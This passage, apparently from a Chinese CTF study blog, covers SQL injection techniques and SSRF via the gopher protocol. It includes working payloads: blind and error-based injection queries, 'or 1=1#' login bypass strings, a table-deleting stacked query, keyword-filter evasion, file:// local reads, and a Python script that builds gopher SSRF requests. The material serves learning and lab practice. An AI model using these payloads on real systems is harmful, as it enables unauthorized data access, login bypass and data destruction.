<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">一般根据数据字符asiic码大小或字符长短，用二分法进行判断字符答案</span><br><span class="line"></span><br><span class="line">长度比如</span><br><span class="line"><span class="number">1</span> and <span class="built_in">length</span>(<span class="built_in">database</span>()) &gt; <span class="number">5</span></span><br><span class="line"><span class="comment">/*意思就是判断数据库名大于5，如果返回假就在小于5里找，如果返回真，就在大于5范围里找，猜测到大概的长度的时候，可以用=试试*/</span></span><br><span class="line"></span><br><span class="line">ascii比如</span><br><span class="line"><span class="number">1</span> and <span class="built_in">ascii</span>(<span class="built_in">substr</span>(<span class="built_in">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment">//substr是截取字符，如上就是从第一个字符截取，截取一个字符</span></span><br><span class="line"><span class="comment">/*意思就是判断数据库名第一个字母的ascii码是否大于110，返回假就在小于110里找，返回真，就在大于110里找，最后可以用=加以确定*/</span></span><br></pre></td></tr></table></figure></div>

<p><code>可以用burpsuite进行payload爆破，用数字字典，直接从0-127（ascii码共127位），然后根据回显，判断，就不用一个一个慢慢尝试</code></p>
<p><code>强烈建议可以学习一下python，这样可以自己针对性的写一个脚本，效率更高</code></p>
<h6 id="（2）基于时间的盲注："><a href="#（2）基于时间的盲注：" class="headerlink" title="（2）基于时间的盲注："></a>（2）基于时间的盲注：</h6><p>即不能根据页面返回内容判断任何信息，用条件语句（if）查看时间延迟语句（sleep()）是否执行（即页面返回时间是否增加）来判断。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> and <span class="built_in">if</span>(length(database()&gt;<span class="number">7</span>,<span class="built_in">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"><span class="comment">/*这里判断如果数据库名大于7，就延迟网页5s，反正没有延迟【就是执行1】，剩下的和bool盲注一样，挨个试试，推测出数据库名和其他数据*/</span></span><br></pre></td></tr></table></figure></div>

<h6 id="（3）基于报错注入："><a href="#（3）基于报错注入：" class="headerlink" title="（3）基于报错注入："></a>（3）基于报错注入：</h6><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。如：单引号、双引号、基于数字型注入。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">比如查询数据库名</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<p> *<strong>注意</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SAS"><figure class="iseeu highlight /sas"><table><tr><td class="code"><pre><span class="line">extractvalue和updatexml只显示32位字符</span><br><span class="line"></span><br><span class="line">所以爆出字符不全时，可以用<span class="meta">left</span>(xxx,<span class="keyword">length</span>)和<span class="meta">right</span>(xxx,<span class="keyword">length</span>)</span><br><span class="line">【注意0x7e也就是~也算字符位，按上面例子用了两个~，所以这里最多只能<span class="keyword">select</span> 30个字符了，但左右都30，一共可以<span class="keyword">select</span> 60个字符】</span><br><span class="line"></span><br><span class="line">或者用<span class="meta">substr</span>(xxx,begin,<span class="keyword">length</span>)，从数据的某个开始【这里的开始位是从1开始，而不是0】截取一部分显示</span><br></pre></td></tr></table></figure></div>

<p>（4）联合查询注入：可以使用union的情况下的注入。</p>
<p>（5）堆查询注入（堆叠注入）：可以同时执行多条语句的执行时的注入。</p>
<p>（6）宽字节注入：</p>
<h5 id="③按照注入点类型来分类："><a href="#③按照注入点类型来分类：" class="headerlink" title="③按照注入点类型来分类："></a>③按照注入点类型来分类：</h5><p>  （1）数字型注入点：许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，其注入点 id 类型为数字若存在注入点，则可以利用网页通过此种结构传递id等信息的原理，构造出类似如下的sql注入语句进行爆破：select * from 表名 where id=1 and 1=1</p>
<p>  （2）字符型注入点：网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where name=‘admin’ and 1=1 ’</p>
<p>  （3）搜索型注入点：这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword=关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where 字段 like ‘%测试%’ and ‘%1%’=’%1%’</p>
<h5 id="④基于程度和顺序的注入-哪里发生了影响"><a href="#④基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="④基于程度和顺序的注入(哪里发生了影响)"></a>④基于程度和顺序的注入(哪里发生了影响)</h5><p>★一阶注射 </p>
<p>★二阶注射 </p>
<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；</p>
<p>二阶注入<strong>类似存储型 XSS</strong>，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入. </p>
<h4 id="1-堆叠注入"><a href="#1-堆叠注入" class="headerlink" title="1.堆叠注入"></a>1.堆叠注入</h4><h5 id="1-堆叠注入定义"><a href="#1-堆叠注入定义" class="headerlink" title="1.堆叠注入定义"></a>1.堆叠注入定义</h5><p>   Stacked  injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在  mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。</p>
<h5 id="2-堆叠注入原理"><a href="#2-堆叠注入原理" class="headerlink" title="2.堆叠注入原理"></a>2.堆叠注入原理</h5><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。<u>试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入</u>。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<u>union 或者union all执行的语句类型是有限的，可以用来执行查询语句</u>，而<u>堆叠注入可以执行的是任意的语句</u>。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：  <code>Select * from products where productid=1;DELETE FROM products</code>当执行查询后，<u><strong>第一条显示查询信息</strong></u>，<u><strong>第二条则将整个表进行删除</strong></u>。</p>
<h5 id="3-堆叠注入的局限性"><a href="#3-堆叠注入的局限性" class="headerlink" title="3.堆叠注入的局限性"></a>3.堆叠注入的局限性</h5><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><strong>下面我以一道题为例解析堆叠注入，该题来自于<a href="../../../../2022/06/21/buuctf-wp"> buuctf的[强网杯 2019]随便注 </a></strong></p>
<h4 id="2-无列名注入"><a href="#2-无列名注入" class="headerlink" title="2.无列名注入"></a>2.<a href="https://www.cnblogs.com/Lee-404/p/12833788.html">无列名注入</a></h4><p>上面链接是一篇大佬讲解的无列名注入，之前刷攻防世界遇到类似的题目，看了这篇文章学到了新技巧</p>
<h4 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="*3.联合注入"></a>*3.联合注入</h4><p><strong>联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据</strong></p>
<p>举个例子：<br>最初users表中只有一行数据，</p>
<p><img src="/2022/05/28/Web-study/image-20220909230928678.png" alt="image-20220909230928678"></p>
<p><strong>我们通过<code>union select</code>查询就可以构造一行虚拟的数据，</strong></p>
<p><img src="/2022/05/28/Web-study/image-20220909231009396.png" alt="image-20220909231009396"></p>
<p>这样，我们在users表中利用联合查询创建了一行虚拟的数据。</p>
<hr>
<h4 id="1-几个常用函数"><a href="#1-几个常用函数" class="headerlink" title="1.几个常用函数"></a>1.几个常用函数</h4><p>1.<code>version()</code>——MySQL 版本 </p>
<p>2.<code>user()</code>——数据库用户名 </p>
<p>3.<code>database()</code>——数据库名 </p>
<p>4.<code>@@datadir</code>——数据库路径 </p>
<p>5.<code>@@version_compile_os</code>——操作系统版本</p>
<h4 id="2-一般用于尝试的闭合语句"><a href="#2-一般用于尝试的闭合语句" class="headerlink" title="2.一般用于尝试的闭合语句"></a>2.一般用于尝试的<u>闭合语句</u></h4><p>Ps:<strong>–+可以用#替换，url 提交过程中 Url 编码后的#为%23，–+和#为注释符，把后面语句注释掉，使其无法执行</strong></p>
<p><code>or 1=1--+</code> </p>
<p><code>&#39;or 1=1--+</code> </p>
<p><code>&quot;or 1=1--+</code> </p>
<p><code>)or 1=1--+</code> </p>
<p><code>&#39;)or 1=1--+</code> </p>
<p><code>&quot;) or 1=1--+</code> </p>
<p><code>&quot;))or 1=1--+</code></p>
<h4 id="3-sql中逻辑运算【万能密码的原理】"><a href="#3-sql中逻辑运算【万能密码的原理】" class="headerlink" title="3.sql中逻辑运算【万能密码的原理】"></a>3.sql中逻辑运算【万能密码的原理】</h4><p>提出一个问题 <code>Select * from users where id=1 and 1=1</code>;这条语句为什么能够选择出 id=1 的内容，and 1=1 到底起作用了没有？这里就要清楚 sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。</p>
<p><code>Select * from admin where username=’admin’ and password=’admin’</code> </p>
<p>我们可以用 <code>’or 1=1#</code> 作为密码输入。原因是为什么？ </p>
<p>这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为： </p>
<p><code>Select * from admin where username=’admin’ and password=’’or 1=1#’</code> </p>
<p>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 <code>username=’admin’ and password=’’or 1=1</code>。三个条件用 and 和 or 进行连接。在 sql 中，我们 <u><strong>and 的运算优先级大于 or 的元算优先级</strong></u>。因此可以看到 <u><strong>第一个条件（用 a 表示）是真的，第二个条件（用 b 表示）是假的，a and b = false</strong></u>,第一个条件和第二个条件执行 and 后是假，再与<u><strong>第三 个条件 or 运算，因为第三个条件 1=1 是恒成立的，所以结果自然就为真了</strong></u>。因此上述的语 句就是恒真了</p>
<p>ps 逻辑语句的区别</p>
<p>1.and:两个或多个条件同时满足，才为真（显示一条数据）</p>
<p>2.or:两个或多个条件满足其中一个即为真（显示一条数据）</p>
<p>使用and语句注意<code>select * from test where a = 1 and a = 2</code>这样操作肯定不行，<u><strong>后面的一个值会把前面的值给覆盖掉</strong></u>，最后执行的是<code>select * from test where a = 2</code></p>
<p>而用or语句的话<code>select * from test where a = 1 or a = 2</code>,执行<code>select * from test where a = 1</code>,若<code>a=1</code>为假，则执行<code>select * from test where a = 2</code></p>
<p>3.union:联合查询，将<u><strong>多个查询结果合并（如果有一个结果为空，不影响其他结果合并）</strong></u>起来时，<u><strong>系统会自动去掉重复元组</strong></u></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">/*这里注意，如果id=1，那么结果合并时，就会覆盖后面的结果，所以这里需要前面的语句返回为空，那么后面的数据就会显现出来*/</span></span><br></pre></td></tr></table></figure></div>

<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。 </p>
<h4 id="4-注入的一般流程【按顺序查询注入】"><a href="#4-注入的一般流程【按顺序查询注入】" class="headerlink" title="4.注入的一般流程【按顺序查询注入】"></a>4.注入的一般流程【按顺序查询注入】</h4><h5 id="ps-关键记忆和使用"><a href="#ps-关键记忆和使用" class="headerlink" title="ps.关键记忆和使用"></a>ps.关键记忆和使用</h5><p><code>schema_name</code> 数据库名</p>
<p><code>information_schema.schemata</code> 全部数据库</p>
<p><code>table_name</code> 表名</p>
<p><code>information_schema.tables</code> 全部表</p>
<p><code>table_schema=’xxxxx’</code> ‘xxxx’为目标表所在的数据库名</p>
<p><code>column_name</code> 列名</p>
<p><code>information_schema.columns</code> 全部列名</p>
<p><code>table_name=’xxxxx’</code> ‘xxxx’想要查询数据所在的表名</p>
<h5 id="1-注入语句"><a href="#1-注入语句" class="headerlink" title="[1] 注入语句"></a>[1] 注入语句</h5><p>1）猜数据库 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select schema_name from information_schema.schemata</code> </p>
<p>2）猜某库的数据表 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select table_name from information_schema.tables where table_schema=’xxxxx’</code> </p>
<p>3）猜某表的所有列【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>Select column_name from information_schema.columns where table_name=’xxxxx’</code> </p>
<p>4）获取某列的内容 【以下语句功能，显示该列】</p>
<p><code>Select 该列的目标数据分类的名称  from   列名</code></p>
<h5 id="2-注入流程图"><a href="#2-注入流程图" class="headerlink" title="[2] 注入流程图"></a>[2] 注入流程图</h5><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1656476375&t=82f2380c052f036e8454035070bc6a42" alt="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&amp;refer=http%3A%2F%2Fimg-blog.csdnimg.cn&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1656476375&amp;t=82f2380c052f036e8454035070bc6a42"></p>
<h4 id="5-mysql错误分析解决"><a href="#5-mysql错误分析解决" class="headerlink" title="5.mysql错误分析解决"></a>5.mysql错误分析解决</h4><h5 id="1）子查询结果多于一行"><a href="#1）子查询结果多于一行" class="headerlink" title="1）子查询结果多于一行"></a>1）子查询结果多于一行</h5><p><code>Subquery returns more than 1 row</code></p>
<p>以<code>select * from table1 where table1.colums=(select columns from table2)</code>这个sql语句为例</p>
<p>1.如果是写入重复，去掉重复数据。然后写入的时候，可以加逻辑判断(php)或者外键(mysql)，防止数据重复写入。（但在实际开发中可能需要重复写入，所以需要慎重考虑）</p>
<p>2.在子查询条件语句加<code>limit 1</code>,找到一个符合条件的就可以了<br><code>select * from table1 where table1.colums in (select columns from table2 limit 1)</code> </p>
<p>如果需要继续向后查询，可以用<code>limit 0,1</code>   <code>limit 1,1</code>   <code>limit 2,1</code>   …..  <code>limit n,1</code></p>
<p>3.在子查询前加any关键字<br><code>select * from table1 where table1.colums=any(select columns from table2)</code></p>
<h5 id="ps-子查询语句"><a href="#ps-子查询语句" class="headerlink" title="ps. 子查询语句"></a>ps. 子查询语句</h5><p><strong>子查询</strong>是指在<strong>一个select语句中嵌套另一个slecet语句</strong>。</p>
<p><strong>any、in、some、all</strong>分别是子查询关键词之一。</p>
<p><strong>any</strong>可以与=、&gt;、&gt;=、&lt;、&lt;=、&lt;&gt;结合起来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的任何一个数据。</p>
<p>all可以与=、&gt;、&gt;=、&lt;、&lt;=、&lt;&gt;结合是来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的其中的所有数据。</p>
<p>他们进行子查询的语法如下：</p>
<p><code>operand comparison_operator any(subquery);</code><br><code>operand in (subquery);</code><br><code>operand coparison_operator some(subquery);</code><br><code>operand coparison_operator all (subquery);</code></p>
<p><strong>any,all关键词必须与一个比较操作符一起使用</strong></p>
<p>any关键词可以理解为<strong>对于子查询返回的列中的<u>任意</u>数值，如果比较结果为ture，则返回true</strong><br>例如：</p>
<p><code>select s1 from t1 where s1 &gt; any (select s1 from t2)</code></p>
<p>假设表t1中有一行包含（10） ， t2包含（20,12,5），则表达式为true；如果t2包含（20,10），或者表t2位空表，则表达式为false。如果t2包含（null，null），则表达式为unkonwn。</p>
<p>all关键词<strong>对于子查询返回的列中的<u>所有值</u>，如果比较结果为true，则返回true</strong><br>例如：</p>
<p><code>select s1 from t1 where s1&gt; all (select s1 from s2)</code></p>
<p>假设表t1中有一行包含（10）。如果表t2包含（-5,0，+5），则表达式为true，因为10比t2中的查出的所有三个值大。如果表t2包含（12,6，null，-100），则表达式为false，因为t2中有一个值12大于10。如果表t2包含（0，null，1），则表达式为unknown。如果t2为空表，则结果为true。</p>
<p>not in 是 “&lt;&gt;all”的别名，用法相同。<br>语句in 与“=any”是相同的。<br>例如：</p>
<p><code>select s1 from t1 where s1 = any (select s1 from t2)</code><br><code>select s1 from t1 where s1 in (select s1 from t2)</code></p>
<p>语句some是any的别名，用法相同。<br>例如：</p>
<p><code>select s1 from t1 where s1 &lt;&gt; any (select s1 from t2)</code><br><code>select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)</code></p>
<h4 id="6-mysql-连接函数，-分组连接函数"><a href="#6-mysql-连接函数，-分组连接函数" class="headerlink" title="6.mysql 连接函数， 分组连接函数"></a>6.mysql 连接函数， 分组连接函数</h4><h5 id="1-concat"><a href="#1-concat" class="headerlink" title="1.concat()"></a>1.concat()</h5><p>concat(str1,str2,…)</p>
<p>若有一个参数为NULL，返回NULL</p>
<h5 id="2-concat-ws"><a href="#2-concat-ws" class="headerlink" title="2.concat_ws()"></a>2.concat_ws()</h5><p>concat_ws(‘间隔符号’,str1,str2,…)</p>
<p><strong>间隔符号可以是空格，不能不写，否则返回为空</strong></p>
<p> 显示为   <u>str1间隔符号str2间隔符号str3…</u></p>
<h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h5><p>group_concat([distinct] 字段名 [ order by 排序字段 asc/desc ] [separator “分隔符”])</p>
<p>多行数据在一行显示函数</p>
<p>根据group by指定的列进行排序分组，将同一组显示出来，并用分隔符间隔</p>
<h5 id="ps-组合使用"><a href="#ps-组合使用" class="headerlink" title="ps. 组合使用"></a>ps. 组合使用</h5><p>如果是多字段组合 显示在一行的eg：</p>
<p>group_concat(concat_ws(‘,’,concat(str1，str2) ) )；</p>
<p>一个字段的话eg：</p>
<p>group_concat(concat_ws(‘,’,str1，str2) )； </p>
<h4 id="7-过滤替换"><a href="#7-过滤替换" class="headerlink" title="*7.过滤替换"></a>*7.过滤替换</h4><h5 id="1）双写绕过"><a href="#1）双写绕过" class="headerlink" title="1）双写绕过"></a>1）双写绕过</h5><p>(用于把黑名单的字符替换成空)：se<u>select</u>lect,un<u>union</u>ion，oorr等等（替换为空后，剩余语句就是标准的sql语句，不会影响语句的正常执行）</p>
<p>ps.注意，有的语句命令可能会带有黑名单的字符，也需要双写，如<u>or</u>der,inf<u>or</u>mation.schema_schemata等，当网站在检查时，同样会被替换为空，所以需要写成o<u>or</u>rder,info<u>or</u>rmation.schema_schemata等等</p>
<h5 id="2）大小写混合"><a href="#2）大小写混合" class="headerlink" title="2）大小写混合"></a>2）大小写混合</h5><p>(用于黑名单中只有小写或大写，并没有对大小写进行区分)</p>
<p>如sEleCt,unIoN等等</p>
<h5 id="3）替换"><a href="#3）替换" class="headerlink" title="*3）替换"></a>*3）替换</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EXCEL"><figure class="iseeu highlight /excel"><table><tr><td class="code"><pre><span class="line">select：</span><br><span class="line"></span><br><span class="line">union：</span><br><span class="line"></span><br><span class="line">空格：%<span class="number">0</span>a（分隔符），() 【如select(table_name)from(xxx)】，&lt; &gt;， %<span class="number">20</span>(space), %<span class="number">09</span>(tab), $<span class="built_in">IFS</span>$<span class="number">9</span>（$<span class="built_in">IFS</span>是**Unix**系统的一个预设变量表示分隔符，$<span class="number">9</span>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</span><br><span class="line"></span><br><span class="line">=：like</span><br><span class="line"></span><br><span class="line"><span class="built_in">and</span>：&amp;&amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">or</span>：||</span><br></pre></td></tr></table></figure></div>



<h4 id="8-注释符"><a href="#8-注释符" class="headerlink" title="8. 注释符"></a>8. 注释符</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BRAINFUCK"><figure class="iseeu highlight /brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">#、</span> <span class="literal">--+</span><span class="comment">、</span> <span class="literal">--</span><span class="comment">%20、 %23</span></span><br></pre></td></tr></table></figure></div>



<hr>
<h3 id="二、xss"><a href="#二、xss" class="headerlink" title="二、xss"></a>二、xss</h3><hr>
<h3 id="三、csrf"><a href="#三、csrf" class="headerlink" title="三、csrf"></a>三、csrf</h3><hr>
<h3 id="四、xxe"><a href="#四、xxe" class="headerlink" title="四、xxe"></a>四、xxe</h3><hr>
<h3 id="五、ssrf"><a href="#五、ssrf" class="headerlink" title="五、ssrf"></a>五、ssrf</h3><h4 id="gopher协议总结"><a href="#gopher协议总结" class="headerlink" title="gopher协议总结"></a>gopher协议总结</h4><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667791">原文</a></p>
<p><a href="https://blog.csdn.net/qq_60115503/article/details/124407499">另一篇推荐的文章</a></p>
<p>gopher协议是一种信息查0找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面</p>
<h5 id="1-利用："><a href="#1-利用：" class="headerlink" title="1)利用："></a>1)利用：</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="code"><pre><span class="line">攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 <span class="meta">GET</span>、POST 请求</span><br></pre></td></tr></table></figure></div>



<p>gopher协议的格式：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IP数据流  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span><span class="regexp">/_POST /</span>flag.php HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="regexp">/*注意_符号*/</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">有时候读取文件需要从网站本身的127.0.0.1发出请求</span><br><span class="line"></span><br><span class="line"><span class="section">/*可以利用file://伪协议用于读取本地文件*/</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line">比如</span><br><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></div>



<h5 id="2-GTE请求"><a href="#2-GTE请求" class="headerlink" title="2)GTE请求"></a>2)GTE请求</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">构造HTTP数据包</span><br><span class="line"></span><br><span class="line">URL编码、替换回车换行为<span class="meta">%</span><span class="number">0</span>d<span class="meta">%</span><span class="number">0</span>a，HTTP包最后加<span class="meta">%</span><span class="number">0</span>d<span class="meta">%</span><span class="number">0</span>a代表消息结束</span><br><span class="line"></span><br><span class="line">发送gopher协议, 协议后的IP一定要接端口</span><br></pre></td></tr></table></figure></div>



<h5 id="3-POST请求"><a href="#3-POST请求" class="headerlink" title="3)POST请求"></a>3)POST请求</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">POST与GET传参的区别：它有4个参数为必要参数</span><br><span class="line"></span><br><span class="line">需要传递</span><br><span class="line">Content-Type,</span><br><span class="line">Content-Length,</span><br><span class="line">host,</span><br><span class="line">post的参数</span><br><span class="line"></span><br><span class="line"><span class="code">----</span></span><br><span class="line"><span class="code">比如：</span></span><br><span class="line"><span class="code">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="code">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="code">Content-Length: 36</span></span><br><span class="line"><span class="code">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">key=51457bb0a50c1eb2c92dcc3ec3c2cc13        //post参数</span></span><br><span class="line"><span class="code">------</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**Host、Content-Type和Content-Length请求头是必不可少的，但在 GET请求中可以没有**</span></span><br><span class="line"><span class="strong">**切记：Content-Length 这个要和底下POST参数[比如例子中key=,4个+51457bb0a50c1eb2c92dcc3ec3c2cc13,32个，共计36个]长度一致**</span></span><br></pre></td></tr></table></figure></div>



<p>python脚本生成payload（POST和GTE请求都适用）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=a68a3b03e80ce7fef96007dfa01dc077</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload) <span class="comment">#对payload中的特殊字符进行编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#CRLFL漏洞</span></span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)<span class="comment"># 对新增的部分继续编码</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<h5 id="构造一个提交文件的POST请求"><a href="#构造一个提交文件的POST请求" class="headerlink" title="构造一个提交文件的POST请求"></a>构造一个提交文件的POST请求</h5><p>首先抓取一个正常提交文件的数据包，然后使用上述脚本将其转换为gopher协议的格式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">​</span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: 